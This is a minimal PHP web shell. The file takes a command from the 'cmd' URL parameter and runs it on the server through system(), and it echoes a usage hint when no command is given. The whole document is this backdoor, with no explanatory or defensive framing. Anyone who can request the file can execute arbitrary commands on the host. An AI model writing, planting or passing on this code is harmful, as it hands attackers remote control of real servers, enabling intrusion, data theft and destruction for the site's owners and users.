<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    system($cmd);
} else {
    echo "Please provide a command using the 'cmd' parameter.";
}
?>
